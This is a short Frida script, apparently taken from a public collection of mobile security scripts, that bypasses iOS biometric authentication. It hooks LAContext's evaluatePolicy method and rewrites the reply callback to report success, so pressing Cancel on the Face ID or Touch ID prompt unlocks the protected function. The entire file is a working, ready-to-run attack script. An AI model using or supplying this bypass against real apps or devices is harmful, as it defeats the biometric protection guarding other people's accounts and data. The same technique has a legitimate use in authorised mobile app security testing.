/* Description: iOS Biometric Bypass
 * Mode: S
 * Version: 1.0
 * Credit: https://github.com/interference-security/frida-scripts/blob/master/iOS
 * Author: @interference-security
 */
var func_name = "LAContext [- evaluatePolicy:localizedReason:reply:] method";
send("\n[*] Hooking: " + func_name);
send("[*] Press CANCEL on biometric authentication prompt to bypass authentication");
var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
Interceptor.attach(hook.implementation, {
	onEnter: function(args) {
		send("[*] Detected call to method: " + func_name);
		var block = new ObjC.Block(args[4]);
		const callback = block.implementation;
		block.implementation = function (error, value)  {
			send("[*] Changing return value to TRUE to bypass iOS biometric authentication");
			const result = callback(1, null);
			return result;
		};
	},
});
